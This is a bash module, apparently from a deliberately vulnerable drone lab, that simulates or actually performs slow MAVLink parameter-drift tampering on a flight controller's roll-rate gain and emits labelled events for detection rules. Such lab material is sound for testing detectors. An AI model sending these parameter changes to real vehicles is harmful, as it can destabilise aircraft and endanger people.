# dvd_lite/dvd_attacks_lpc/modules/mavlink_param_drift.sh
#!/usr/bin/env bash
# Slow param drift against FCU via MAVLink (LPC 표준 이벤트 정렬)
set -euo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/sh_core/metrics.sh"

: "${PARAM_NAME:=ATC_RAT_RLL_FF}"
: "${INTENSITY:=low}"   # low|medium|high
: "${DUR:=10}"          # seconds

case "$INTENSITY" in
  low) STEP=0.005 ;; medium) STEP=0.02 ;; high) STEP=0.05 ;;
  mid) STEP=0.02; INTENSITY=medium ;;  # alias
esac

main(){
  log "[mavlink_param_drift] mode=$LPC_MODE param=$PARAM_NAME step=$STEP dur=$DUR"

  # === LPC 표준 이벤트(룰 매칭용) ===
  bus_emit "attack" "kind=mavlink_param_drift intensity=$INTENSITY target=${DVD_MAVLINK_HOST}:${DVD_MAVLINK_PORT} note=begin"

  local before after; before=$(obs_snapshot "${DVD_C_GCS:-ground-control-station}" "${DVD_TARGET_IF:-eth0}")

  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then
    # 실제 PARAM_SET (가능한 환경에서만)
    python3 "$BASE/interface/mavlink_cmd.py" --host "$DVD_MAVLINK_HOST" --port "$DVD_MAVLINK_PORT" \
      set-param "$PARAM_NAME" "$STEP" || true
    # 호환 로그(기존 분석 파이프가 보는 태그)
    bus_emit "mavlink" "action=param_set name=$PARAM_NAME step=$STEP target=${DVD_MAVLINK_HOST}:${DVD_MAVLINK_PORT}"
  else
    # 시뮬 전송 흉내 + LPC 표준과 병행
    bus_emit "mavlink" "action=param_drift_sim name=$PARAM_NAME step=$STEP"
  fi

  # 드리프트 진행 동안 CTI 힌트(분석용)
  TICK=1
  for _ in $(seq 1 "$DUR"); do
    bus_emit "cti" "kind=mavlink_param_drift_tx value=$STEP"
    sleep "$TICK"
  done

  # 강도별 hold 힌트(룰에서 사용)
  case "$INTENSITY" in
    low)    HOLD=10 ;; medium) HOLD=20 ;; high) HOLD=30 ;;
  esac
  bus_emit "attack_hint" "kind=mavlink_param_drift intensity=$INTENSITY hold_s=$HOLD"
  bus_emit "attack"      "kind=mavlink_param_drift intensity=$INTENSITY note=end"

  after=$(obs_snapshot "${DVD_C_GCS:-ground-control-station}" "${DVD_TARGET_IF:-eth0}")
  delta_emit "$before" "$after" "mavlink_obs"
}
main "$@"
